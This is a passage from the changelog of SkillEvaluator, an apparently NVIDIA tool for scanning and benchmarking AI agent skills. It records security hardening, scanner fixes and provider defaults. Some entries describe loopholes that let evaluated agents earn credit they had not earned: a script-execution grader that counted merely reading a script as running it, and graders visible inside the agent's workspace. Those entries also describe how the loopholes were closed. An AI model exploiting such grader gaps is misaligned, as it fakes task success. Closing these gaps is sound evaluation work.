  protected path, not the patch. Every header in the patch is checked.
- Mask GitHub tokens (`ghp_`, `gho_`, `ghu_`, `ghs_`, `ghr_`, and `github_pat_`) in Tier 3
  evidence excerpts and Harbor verifier log output.
- Stop the PII scan reporting User-Agent product versions such as `Chrome/140.0.0.0`
  as public IP addresses. Chromium's reduced User-Agent gives every version this shape.
- Separate Tier 2 collection limits from the 256-file per-skill limit. Fresh
  similarity scans now allow 1,024 selected manifests and 128 million scalar
  comparisons by default, covering 343 skills with 2,048-dimensional embeddings.
  Add `--max-entries` and `--max-scalar-comparisons` for explicit scan budgets;
  exceeded limits fail with actionable errors and never truncate the collection.
  Fresh pairwise scans reject excessive scalar work after the first validated
  embedding response, before requesting more embeddings or saving a catalog.
  Collection discovery has its own 20,000-path ceiling, allowing the supported
  5,000-entry maximum for minimal collections while retaining the 4,096-path
  per-skill ceiling. Invalid Python command API budgets raise option-specific
  errors before provider initialization. Similarity comparisons validate and
  normalize each vector once instead of once per pair, making large pairwise
  scans more than an order of magnitude faster. Equal nonzero embeddings score
  exactly 1.0, so `--threshold 1` reports exact duplicates.
- Keep headings and comments inside fenced code examples in their enclosing Markdown
  section during Tier 2 content chunking, preserving original source line numbers.
- Run the public Docker image as an unprivileged user, with writable default report and home directories.
  Document UID/GID overrides for host-owned output mounts.
- Pin the HTML report Chart.js dependency and verify its integrity before browser execution.

- Preserve full Codex gateway model IDs in cloud environments, including E2B
  and Daytona, while retaining local runtime setup and native provider routing.
- Keep Tier 2 execution diagnostics visible alongside duplicate findings in
  CLI, HTML, and Markdown reports, without repeating the findings as errors.
- Use `nvidia/nemotron-3-super-120b-a12b` as the shared NVIDIA Build default for
  evaluator chat, agent execution, and judging, preserving explicit model overrides.
  Request nonstreaming chat responses explicitly to match the response parser.
- Tier 2 LLM failures now identify the selected provider and model, HTTP status,
  safe error metadata, and failed-cluster count without exposing response bodies.
- Replace the retired NVIDIA embedding default with `nvidia/nemotron-3-embed-1b`
  and send the required passage input type for NVIDIA document comparisons.
  Existing catalogs and caches must be rebuilt when switching embedding models.
- Report Tier 2 embedding and LLM service failures as incomplete checks, retaining
  a nonzero exit without inventing duplicate-content findings. Provider error
  messages include recovery guidance without echoing raw response bodies.
- Tier 3 script execution credit now requires evidence that the expected script
  was invoked. `check_script_execution` previously treated the script name as a
  substring of an execution command, so reading, printing or searching the
  script, or running a similarly named file, scored a full `Executed <script>`.
  Credit is now given only for a recognised invocation: the script run directly,
  an interpreter given it as its script argument, a `source`, or a `sh -c`
  payload that does one of those, with `cd` tracked and script identity compared
  exactly. Interpreter and wrapper options come from grammars derived by running
  each option against a script that records whether it executed, so `--help`,
  `perl -c` and `bash -n` run no script while `python -Wignore` and
  `env FOO=1` still resolve to theirs. A command the walk cannot resolve keeps
  the existing 0.75 partial credit rather than being scored either way: a path
  built at run time, an option outside a grammar, a name only in heredoc data,
  inline code or a module that names the script, and anything reaching a command
  through standard input, including `xargs` and `parallel`, whose behaviour the
  command text never determines. Partial credit is only ever given for a
  command that names the script: an unresolved command that never mentions it
  scores zero, as before. Redirections standing before the script
  (`python3 < /dev/null run.py`), a script's own arguments that look like shell
  options (`bash run.sh -c '...'`), invocations inside `if`, `while`, `until`
  and `for` bodies, and versioned interpreter names (`perl5.38.2`, `python3.13`)
  resolve as the shell runs them. A loop over an empty list keeps the earlier
  binding and its body is not read; a binding made inside `( ... )` stays
  there; the last command of a pipeline keeps its bindings where the shell
  does (zsh, ksh) and not where it forks it (bash, dash, mksh), with an
  option change that could move it (`shopt -s lastpipe`, `emulate sh`)
  read as unresolved; a quoted or escaped word that would read as syntax
  (`'done'`, `printf "("`, `';|'`) is the ordinary word it is; groups and
  compound pipeline stages nest in either order, each compound tested for its
  own pipe; `((` closed by `))` is an arithmetic command where the shell has
  one; the positional
  parameters are empty unless the text gives some, so `for f; do` at the top
  level runs nothing and keeps the variable's value; an interpreter fed its
  program by a pipe (`cat run.py | python3`) is unresolved like
  `python3 < run.py`; a variable bound by `export` or `readonly`, or by
  `declare` and `typeset` where the shell has them, holds the value it had
  when the builtin ran, `unset` empties it, `+x` and `export -n` unexport it
  however the builtin is reached, and one bound from data the text does not
  carry (`read`, `printf -v`, `local` outside a function, `declare -u`, a name
  `eval` may bind, including from a program held in a variable) is
  unresolved, as is a later assignment to a name given `-i`, `-u` or `-n`,
  while `-l` lowercases it and an array is never exported; what is done to a
  `-n` name (`nameref` in ksh and mksh) leaves the name it refers to
  unresolved; `let`, `$((...))` and `$[...]` assign as `((...))` does; an
  assignment the shell rejects (a value that is not a number for an `-i`
  name) and a special builtin given an option the shell rejects end the
  credit where the shell stops there; an assignment written before a command,
  `env NAME=value` included, is that command's environment only, reaching
  neither its own words nor the commands after it, except before a special
  builtin in the POSIX shells; a `-c` payload's shell sees the exported names,
  its command's own prefix and what `env` adds and removes, and a `$` quoted
  or escaped from the outer shell is expanded there (one left unquoted is
  expanded here, a name never bound to nothing), with the payload's own
  heredoc bodies kept as data; text that `eval`, inline
  code or a shell reading a heredoc may expand again is unresolved when a
  variable in it holds the script; every heredoc declared on a line takes its
  body after the line, in order, and past the number a shell accepts on one
  line (16 in bash) the line and the rest are data; a here-string, which dash
  and busybox ash reject before running anything, leaves nothing credited
  under those shells, and so does a compound's opening word written after an
  assignment (`A=1 for ...`, `A=1 if ...`, `A=1 ( ... )`), which every
  modelled shell rejects and which no longer raises; `(((` is a subshell
  around `((` in bash, zsh and mksh; and `ksh`, `mksh` and `ash` are
  recognised shells.
  Applied to both the host checker and the bundled Harbor verifier.

- Added `scripts/script_invocation_differential.py`, a differential harness that
  executes each command for real against fixtures that record whether they ran,
  and compares the result against both implementations. `--baseline REF` also
  scores every command with the checker at an earlier ref and lists each score
  that moved, so a change that lowers a command that ran, or raises one that
  did not, is seen before it is pushed.

### Added

- Interactive top-level help now opens with a green SkillEvaluator wordmark,
  installed version, and tier overview. Narrow terminals use a compact header;
  redirected output and subcommands keep their existing output format.

- OpenAI-compatible gateways now have chat, embedding, and separate Codex,
  Claude Code, and OpenCode model defaults. Set the provider, URL, and key;
  override model IDs when the gateway uses different catalog names. Claude
  Code inherits the gateway route unless an explicit Anthropic route is set.
  Run reports identify harness defaults separately from CLI/config overrides.

- Run individual tiers directly with `skillevaluator tier1 PATH`, `tier2 PATH`,
  and `tier3 PATH`, while retaining the expert subcommands. Tier 1 includes
  dependency checks and enables LLM checks when configured; Tier 2 reports
  whether a catalog comparison ran; Tier 3 creates a missing starter dataset
  and preserves existing evaluation sources.

### Changed

- Show elapsed waiting time during autopilot dataset generation and identify
  deterministic starter datasets used after a provider failure. Fully unscored
  Tier 3 runs show an `INCOMPLETE` summary with coverage, consolidated execution
  errors, and recovery steps; completed comparisons highlight overall Skill
  Lift ([#152](https://github.com/NVIDIA/SkillEvaluator/pull/152)).
- Harden documentation publishing with restricted token permissions, pinned
  checkout and Fern versions, and disabled persisted checkout credentials.
  Apply the checkout credential restriction to DCO checks
  ([#158](https://github.com/NVIDIA/SkillEvaluator/pull/158)).
- Add the methodology paper as the preferred citation and link research,
  developer-blog, and livestream resources from the README
  ([#146](https://github.com/NVIDIA/SkillEvaluator/pull/146),
  [#159](https://github.com/NVIDIA/SkillEvaluator/pull/159)).
- `validate PATH` now runs all three tiers for skills by default. Tier 3
  autopilot reuses an existing evaluation source or creates one starter case
  when none exists. `--full` remains compatible but is unnecessary;
  `--tiers`, `--no-tier3`, and `--no-autopilot` provide explicit scope controls.
  Keyless static CI gates should select `--tiers 1`.
- Tier 3 now selects a provider-native agent when `--agents` is omitted:
  OpenCode for NVIDIA Build, Codex for OpenAI, and Claude Code for Anthropic.
  NVIDIA Build agent runs default to Nemotron Super; explicit agent and model
  overrides remain unchanged.
- Tier 3's extra agent runtime preflight is now disabled by default because it
  executes the first real task prompt and incurs agent runtime and model cost.
  Enable it explicitly with `--agent-runtime-preflight` on either `tier3` or
  `validate`, or with `harbor.agent_runtime_preflight: true` in `evals/config.yml`.
- Missing-provider and API-key errors now show concise, copyable setup steps
  and a link to advanced configuration. Tier 1 also explains `--no-llm`.
- `tier1 validate` now runs only Tier 1, matching `tier1 PATH`. The top-level
  `validate` command retains its combined pipeline behavior.
- README and getting-started guides lead with provider-plus-key setup for
  NVIDIA Build and OpenAI, explain inherited model defaults, and separate
  credentials from scanner and agent runtime requirements.

## 0.3.0 - 2026-09-17

### Added

- Catalog validation now writes `catalog-summary.json` at the reports root with
  per-skill pass/fail status, optional severity rollups from child JSON reports,
  and paths to per-skill report directories.
- Catalog `validate` accepts `--workers N` to validate skills in parallel child
  processes (default 1 preserves the serial per-skill pipeline view).
- `SKILL_EVAL_MODEL_CATALOG_ALLOW_HTTP_HOSTS` names hosts whose model catalog may
  be read over plain HTTP. Catalog reads still require HTTPS for every other
  non-loopback host. Entries match one whole host as written, with no name
  resolution. A plain-HTTP request to an accepted host bypasses any inherited
  HTTP proxy so its bearer token is not offered to an intermediary. The
  transport rechecks authorization before dispatch and rejects hosts that
  are no longer allowed.
- Published benchmark cards record the evaluated source identity. `BENCHMARK.md`
  now carries `Evaluated source`, `Evaluated source revision` and
  `Evaluator container revision` as separate fields, so a reader can tell which
  source tree was evaluated apart from the evaluator build that evaluated it.
  Previously two skills evaluated from different repositories by the same
  evaluator container produced cards whose only recorded revision was the shared
  container tag. `validate` and `tier3 evaluate` take the identity as
  `--evaluated-source-repository`, `--evaluated-source-revision` and
  `--evaluator-container-revision`. `validate` records it on the card and in
  the top-level `evaluated_source` object of its JSON report and forwards it to
  every child of a parallel catalog run; both commands persist it into a Tier 3
  run's `run_config.json`. It can also arrive as the `evaluated_source`
  argument to `build_agent_eval_payload`, as an `evaluated_source` object in the
  run's `run_config.json`, or as `metadata["evaluated_source"]` on any
  validation result. It is never inferred from repository state while rendering,
  because the tree that renders a card is the evaluator checkout rather than the
  evaluated skill's source. Every populated carrier, including the payload of
  every Tier 3 result, is folded into one identity before any report is
  written, so carriers that disagree fail closed with nothing published instead
  of letting result ordering decide which source tree a card claims to describe.
  A revision is accepted only in an unambiguous shape: a full Git object id
  (40 or 64 hex characters), or a digest whose width matches the algorithm it
  names. A container revision is an image reference validated by component (a
  repository path of up to 255 characters, an optional tag of up to 128, and a
  digest at its algorithm's width), so a long repository name is no longer
  discarded. The 255 bound measures the path once the registry host is split
  off it. Path components are lower case, as the OCI grammar requires, while a
  registry host may use any case and is read as a host only when it is
  `localhost`, carries a dot, or carries a port.
  `check_public_benchmarks.py --require-source-provenance` requires the
  fields and fails any card publishing a `PASS` without them, including a
  `PASS` whose evaluator container is named by a mutable tag rather than
  pinned by digest. SkillEvaluator's own CI now runs the scan with that flag;
  it stays opt-in for trees whose cards predate the contract
  ([#72](https://github.com/NVIDIA/SkillEvaluator/issues/72)).
- SARIF 2.1.0 reporter (`-r sarif`) for GitHub Code Scanning and other SARIF
  consumers. Findings map to rule IDs, severity levels, and file locations from
  Tier 1 validation results.

### Fixed

- Fully covered documentation-only skills no longer fail security validation
  solely because non-applicable SkillSpector analyzers report a partial status
  ([#137](https://github.com/NVIDIA/SkillEvaluator/issues/137)).
- Embedding chunking now rejects zero-sized or non-progressing windows before
  entering the splitter or contacting the embedding provider
  ([#139](https://github.com/NVIDIA/SkillEvaluator/issues/139)).
- Scoped network exfiltration command flag patterns in security checks, enforcing command-position anchoring, quote-aware argument segmentation, explicit HTTP method flags, and case-sensitive `-F`/`-d`/`-T` flags to prevent false-positive flags on safe URLs, packages, or download scripts while reliably detecting quoted secrets and subshell wrappers.
- Malformed, non-UTF-8, or unreadable bundled and custom policy files now
  produce path-specific CLI errors instead of leaking raw parser or I/O errors
  ([#128](https://github.com/NVIDIA/SkillEvaluator/issues/128)).
- `create-eval-dataset --refine` resolves Harbor trial case ids from persisted
  `reward.json` `entry_id` metadata, using folder-name parsing only as an
  unambiguous legacy fallback.
- Tier 3 local mode now drops evaluator-managed empty process-loader resets
  while continuing to reject non-empty loader overrides, allowing generated
  tasks to reach agent execution
  ([#132](https://github.com/NVIDIA/SkillEvaluator/issues/132)).
- Unpinned-dependency warnings are no longer suppressed by comparison
  operators inside PEP 508 environment markers; requirements such as
  `pkg; python_version < "3.13"` are now correctly reported, while direct
  references are treated as pinned independently of marker contents.
- Schema, frontmatter, quality parsing, and security PII scanning accept a leading
  UTF-8 BOM, matching the unicode scanner's "benign BOM" note
  ([#91](https://github.com/NVIDIA/SkillEvaluator/issues/91)).
- SPDX headers keep the full license expression, so `MIT OR GPL-3.0` is
  no longer truncated to MIT and allowed. Closing comment markers such as
  `*/` and `-->` are not treated as part of the expression
  ([#86](https://github.com/NVIDIA/SkillEvaluator/issues/86)).
- Windows personal-path PII now flags `C:\Users\...` usernames that start with
  `s` (for example `steve`), matching the intended whitespace class rather than
  excluding the letter `s` ([#87](https://github.com/NVIDIA/SkillEvaluator/issues/87)).
- Quality scoring, script lint, and `create-eval-dataset` now treat `tools/`
  the same as `scripts/` for executable helpers.
- License detection no longer treats a frontmatter `license` identifier as
  authoritative when a LICENSE file declares a different license. Claiming
  MIT while shipping GPL-3.0 now fails closed. Every LICENSE/COPYING file is
  reconciled, NOTICE files stay informational, an unidentified license file is
  not treated as absent, and a blocking conflict no longer publishes
  `license_status=allowed`
  ([#85](https://github.com/NVIDIA/SkillEvaluator/issues/85)).
- `--llm-verify` now refuses to send file context from paths outside the
  skill root, including `..`, absolute paths, and outbound file symlinks.
- Gitleaks path allowlist now skips test/example/fixture/mock directories
  instead of any path containing those substrings, so files like `latest.py`
  are scanned.
- Gitleaks CI now limits pull-request and push scans to history reachable from
  the checked-out commit, while audit events retain all-ref coverage,
  preventing unrelated refs from causing false failures
  ([#106](https://github.com/NVIDIA/SkillEvaluator/pull/106)).
- The Tier 3 agent runtime preflight now fails with an actionable diagnostic when
  the results directory is not visible to the Docker daemon. Previously the smoke
  run passed -- agent output travels over the Docker exec API rather than through
  the mounts -- and every scored trial then failed with `RewardFileNotFoundError`
  while the rewards sat inside the daemon's own filesystem.
- Dead-link validation now uses the shared CommonMark parser, covering
  reference-style and HTML links while preserving Markdown image checks and
  consistently normalizing local destinations. Root-absolute URLs are ignored
  instead of being treated as host paths; href-only diagnostics collapse
  repeated links to the same normalized target. Invalid destination bytes do
  not alias other files, relative URLs that normalize to absolute or
  drive-relative paths are reported without lookup, lookup failures remain
  per-link findings, and link diagnostics are bounded and escaped. Malformed
  frontmatter and repeated unclosed HTML comments no longer abort or stall
  supporting-document checks.
- Tier 3 accuracy and custom goal judges now retry one malformed (including
  empty) or schema-invalid response with a 4096-token output budget before
  failing closed, preventing a transient formatting error from making an otherwise
  successful trial and its full comparison arm unscoreable. Generated and
  injected Harbor verifier configs now reserve 600 seconds for six sequential
  direct provider attempts plus fail-closed artifact writes. Explicit native
  task timeouts remain owner-controlled and are not rewritten, and whole jobs
  defer to Harbor's task-configured phase controls instead of a hidden two-hour
  cap
  ([#70](https://github.com/NVIDIA/SkillEvaluator/issues/70)).
- PII scanning no longer treats Markdown ATX headings as code comments, so
  emails in headings such as `# Contact: ...` are flagged. Hash lines inside
  Python strings, YAML scalars, and shell heredocs are scanned too. Real
  comments stay skipped, including YAML frontmatter, fenced code, and
  `requirements.txt` ([#88](https://github.com/NVIDIA/SkillEvaluator/issues/88)).
- Tier 3 Harbor collection no longer scans an agent's unstructured transcript
  for runtime-error phrases when the recorded exception belongs to the
  verifier, health check, or task. Correct answers that discuss errors such as
  `401 Unauthorized` are no longer misreported as agent runtime failures.
- SkillSpector reports now use validated version-specific completeness
  contracts. Valid findings from coherent 2.10+ partial scans remain visible
  while the result stays incomplete, and fully covered 2.9.5/2.9.6 `--no-llm`
  reports remain compatible. Contradictory finding or component totals and
  duplicate component identities fail closed. Versioned findings require
  producer paths, and complete reports reconcile universal analyzer work with
  the component inventory. Reports scored before 2.10 finding compaction remain
  accepted. Shipped bytecode findings, source-scoped executable evidence, and
  version-specific finding identities remain authoritative without overstating
  compacted or hidden finding evidence. SkillSpector 2.11+ requires bundled
  execution-surface analyzer evidence; 2.11.1+ uses classification-aware
  finding IDs while rejecting conflicting reuse of an ID.
- Tier 3 paired pass@k evidence now respects Python's active integer-string
  conversion limit, preserves nonzero Wilson interval widths and paired-effect
  directions at large case counts, and documents exact-rational omission
  markers.
- Tier 3 now decodes bounded native Codex `exec` wrappers into their static
  tool calls. It preserves call order and outer-call provenance, maps an outer
  observation only when its rendered inner call is known, keeps ambiguous
  observations explicit, and reports unsupported or malformed JavaScript as
  untrusted instead of a clean security result.

## 0.2.1 - 2026-08-24

### Added

- Added a public benchmark publication gate, regression coverage, and a
  documented rollout plan for generated `BENCHMARK.md` cards.
- Tier 3 pass@k results now include per-arm 95% Wilson score intervals and,
  when case identities pair completely, direction-preserving paired outcomes
  with a two-sided exact McNemar diagnostic, its attainable-p resolution limit,
  and the paired pass-rate delta.

### Changed

- Unified Tier 3 scoring around the canonical five dimensions, persisted an
  immutable dataset-truth snapshot with provenance metadata, and redesigned
  `BENCHMARK.md` as a decision-first publication card.
- Updated public OpenAI / Anthropic / Bedrock chat defaults to pinned frontier
  models (`gpt-5.6-sol`, `claude-opus-5`, `us.anthropic.claude-opus-5`),
  centralized in `provider_config`, and documented `gpt-5.4-mini` as the
  lower-cost OpenAI `SKILL_EVAL_LLM_MODEL` alternative. Raised
  dimension/insights judge token budgets to 4096 and widened the gpt-5\*
  temperature guard to bare model IDs.

### Fixed

- Tier 3 now exercises each resolved agent route and the enabled standard-
  grading route against its provider's model catalog before image preparation
  or task staging. Definitive native-provider authentication and deterministic
  Bedrock credential/configuration failures stop immediately with a redacted
  diagnostic. Non-authoritative OpenAI catalog permission/membership results,
  public or compatible catalog success that does not authenticate inference,
  compatible-gateway catalog authentication, transient failures, and native
  Harbor judge selection resolved only at runtime continue as degraded checks.
  Redacted per-route outcomes are retained even when the later agent runtime
  preflight fails ([#71](https://github.com/NVIDIA/SkillEvaluator/issues/71)).
- Tier 3 Harbor collection now accepts the `step_results: null` sentinel
  emitted for successful single-step trials while retaining fail-closed
  validation for malformed non-null multi-step result containers.

- Tier 3 eval-dataset generation now parses `SKILL.md` frontmatter as YAML.
  The previous line-based scan captured block-scalar indicators verbatim, so a
  `description: >-` became the literal string `>-` in every generated prompt,
  and multi-line quoted scalars were silently truncated to their first line.

- GitHub Actions pull request reports now link source targets to the checked-out
  repository revision instead of the synthetic `<number>/merge` ref, preventing
  broken or cross-repository links.
- Tier 3 LLM insights now receive explicit labels and bounded expected-behavior
  context for `expected_skill: null` negative controls, and the judge is
  instructed not to flag unrelated successes without invocation or
  failed-routing evidence.
- Fixed Anthropic API-root normalization across evaluator and Claude Code
  paths, and made required Tier 3 judge failures fail closed instead of
  appearing as numeric zero scores or publishing misleading quality results
  ([#55](https://github.com/NVIDIA/SkillEvaluator/issues/55)).
- Tier 3 now normalizes host-configured `LLM_JUDGE_MODEL` and
  `SKILL_EVAL_JUDGE_MODEL` overrides in Harbor's parent process and forwards
  the selected value through its verifier-only job layer for standard grading.
  This lets native separate-verifier placeholders resolve without injecting
  either name into the evaluated agent's initial environment. Skill-authored
  `runtime_env` and native task `[environment.env]` tables cannot set or alias
  either operator-controlled override.
  Native verifier declarations remain compatible, while the job-level value
  takes precedence during standard grading. Tier 3 results now record the
  configured judge provider, model, source, and whether a dedicated job-wide
  override was applied, separately from agent models. A provider fallback may
  still use a different model for an individual judge call.
- Quality scoring now uses boundary-aware lexical matching and CommonMark-parsed
  structural links instead of hand-written Markdown parsing or regex inference
  of author intent. Deterministic checks no longer infer MCP negation, temporal
  intent, README guidance, or exclusivity from prose;
  use `rubric-eval` for semantic documentation judgments and Tier 3 for
  observed agent behavior.

## 0.2.0 - 2026-08-18

### Security

- Secure Docker exec redaction now ignores environment values shorter than eight
  characters, matching the exact secret length floor used elsewhere. Short
  flags such as `CLAUDE_CODE_DISABLE_POLICY_SKILLS=1` no longer rewrite digits
  in `docker exec` output, which had broken NVIDIA Build bridge loopback
  origins during Tier 3 preflight.

### Changed

- Added explicit `--block-on-dedup` / `--no-block-on-dedup` and
  `--block-on-agent-eval` / `--no-block-on-agent-eval` controls with
  backward-compatible defaults, Tier 3 source preflight, and consistent gating
  metadata across CLI, JSON, Markdown, and HTML reports.
- Reduced pull-request runner use for changes confined to `docs/**` and
  `fern/**`: DCO, Gitleaks, and pinned Fern validation still run, while mixed
  and non-docs changes retain the complete Linux, macOS, Windows, packaging,
  and security matrix. Superseded pull-request CI and security runs are
  cancelled so they do not consume runners after a newer commit is pushed.
  Path classification executes from the pull request base revision so a
  change cannot weaken its own CI routing.

### Fixed

- Quality scoring now uses boundary-aware and context-aware matching for XML tags,
  reserved names, MCP guidance, README references, time references, exclusivity
  language, instruction action verbs, and nested Markdown links, avoiding
  incidental-word score changes.
- Tier 3 generated tasks now stage only an entry's declared `files`, preventing
  undeclared fixtures from the shared `evals/files/` directory from appearing
  in that task's `/workspace/input/`, while preserving copy-all behavior for
  legacy entries that omit the field. Agent-visible target, reference, and
  workspace skill projections now omit evaluator-owned `evals/` directories
  from every staged skill package, including sanitized `--copy-repo` contexts,
  while graders, native tasks, custom
  environments, and declared inputs continue to load from the source dataset.
  Authenticated historical result trees are also excluded after output rotation,
  invalid markers fail closed, and late Codex, Cline, Goose, and Qwen
  skill-discovery roots are reset before agent execution. Pre-upgrade custom
  result roots outside `evals/` have no authenticity marker and cannot be
  distinguished safely from authored runtime content. Move or delete that old
  content before `--copy-repo` or other full-context evaluation, then rerun with
  this version if replacement evidence is needed. Explicit task inputs cannot
  select evaluator-owned datasets, configuration, graders, tests, native tasks,
  environments, or results. Every agent and baseline arm now reads from one
  private, selective evaluator snapshot containing the active control files,
  task-source data, consumed fixtures and grader, and the complete authored
  custom environment. Legacy omitted-file entries retain the full shared files
  corpus. Unrelated evaluator subtrees and generated results stay outside the
  snapshot. MCP configuration and completed-run artifacts are
  read through bounded descriptor-anchored roots; on Windows, selected file
  handles deny concurrent writes and deletes while live. Historical unmarked
  runs created before canonical run-level `result.json` remain discoverable only
  when their stable configuration and summaries satisfy the complete historical
  schema. Pre-status scored summaries remain consumable, coherent status-era
  failures remain visible without contributing scores, and marked current
  partial runs continue to fail closed.
- Tier 2 scans now validate but do not follow the exact contained
  `CLAUDE.md -> AGENTS.md` compatibility alias, scanning the exactly named,
  independently discovered, single-link regular target once while continuing
  to reject hard-linked selected files, linked manifests, directories, and all
  other file redirects.

## 0.1.0 - 2026-08-05

### Added

- CI DCO check that fails pull requests whose commits lack a `Signed-off-by`
  trailer, matching the sign-off requirement in `CONTRIBUTING.md`.
- Initial public release candidate.
- Enabled optional semantic-version validation in the default Tier 1 pipeline,
  including a public `--previous-version` monotonic-bump bound.

- Added NVIDIA Build live-agent paths: direct OpenCode support plus Docker
  compatibility bridges for Codex and experimental Claude Code, including
  multi-turn tool-call continuation.
- Fern documentation site configured for `docs.nvidia.com/skills/skillevaluator`,
  building the `docs/` guides (installation, configuration, and the three
  evaluation tiers) as MDX pages.
- Expanded the documentation site to fifteen pages — quickstart, eval
  datasets, agents and sandboxes, custom graders, reports, CI integration,
  CLI reference, and environment variables — under a task-oriented
  navigation, with every command verified against the current CLI.

### Security

- Isolated NVIDIA Build bridge credentials from vendor CLI processes using a
  transient, root-managed, container-only key handoff with cleanup on failure.
- Removed NVIDIA Build secrets from Harbor and Docker exec arguments using a
  host-only key file, a non-secret subprocess sentinel, and per-exec container
  handoffs; provider-secret aliases in `runtime_env` are rejected.
- Hardened compatibility-bridge startup with a dynamic loopback port and
  authenticated, process-bound readiness instead of a fixed health endpoint.
- Tightened local macOS Seatbelt policy so nested workspaces can traverse home
  directory metadata without gaining directory-listing or sibling-file access.
- Removed implicit host-side pytest execution from default Tier 1
  code-integrity validation. Test evidence is now collected with contained,
  filename-only discovery that does not import or execute target-controlled
  Python code.

### Changed

- Simplified the repository README into a concise documentation landing page,
  retained a compact keyless `validate` quickstart, LLM-provider setup, and a
  one-command `validate --full` path through all three tiers, broadened the
  project description to agent artifacts starting with agent skills, and moved
  detailed guidance to `docs.nvidia.com/skills/skillevaluator`.
- Added Tier 3 cost-planning guidance, including trial-volume multipliers,
  cost-saving flags, and the cost and isolation tradeoffs of local mode.
- Standardized the product name as `SkillEvaluator` across documentation,
  repository metadata, CLI output, and generated report artifacts.
- Removed the optional OpenTelemetry integration, the
  `skillevaluator[telemetry]` extra, and the `skillevaluator.telemetry` Python
  module from the public distribution. Imports of that module now fail rather
  than providing the former telemetry and safety helpers. Redaction and
  child-process environment filtering remain available from
  `skillevaluator.utils.redaction` and
  `skillevaluator.utils.process_environment`; direct Protobuf and OpenTelemetry
  dependencies are no longer installed.
- Changed the public OpenAI default to `gpt-5.4-mini` and the NVIDIA Build
  default to `nvidia/nemotron-3-nano-30b-a3b`; OpenCode, Codex, and experimental
  Claude Code now resolve that Build default without redundant model flags.
- Tier 3 now streams staging, arm submission, completion, failure, collection,
  and report-writing progress instead of appearing idle during Harbor startup.
- Tier 3 now reports structured agent/provider failures such as NVIDIA Build
  capacity exhaustion instead of scoring a no-trajectory fallback or emitting
  a generated Harbor task-name mismatch.
- Replaced provisional `test_coverage`, `tests`, and `coverage_percent` output
  with one `test_discovery` detail. Reports now include `test_count`, supported
  filename patterns, `execution_performed=false`, and
  `coverage_measured=false`; projects must run tests and measure coverage in a
  trusted environment or explicit sandbox.

### Fixed

- Public benchmark cards now omit policy profiles, redact absolute host paths,
  and normalize imported internal or retired metadata before publication.
- Previous-version validation now rejects catalog-wide scalar reuse and removal
  of an already bounded `metadata.version` label.
- Tier 1 and Tier 2 now ignore only the exact public SPDX metadata preamble,
  distinguish package versions from network addresses, recognize canonical
  `agents/` and `tests/` support directories, and keep Ruff on the validated
  0.15 release line.
- Accepted structurally complete SkillSpector finding reports on policy exit 1
  and hardened validation of the external scanner's untrusted JSON contract;
  SkillSpector remains separately installed and unpinned by this distribution.
- Programmatic dataset generation now returns explicit created, preview, and
  unchanged outcomes, preserves actionable failures, and no longer mutates
  process-wide command-line arguments.
- Security and full-feature installs now work on RHEL 8 and other glibc 2.28
  Linux systems by keeping Semgrep and SkillSpector in separate tool
  environments while retaining compatible bundled Python dependencies.
- Tier 2 content collection now prunes configured evaluation and version
  artifact directories before enforcing the discovered-path limit, so excluded
  generated results cannot cause false path-count failures.
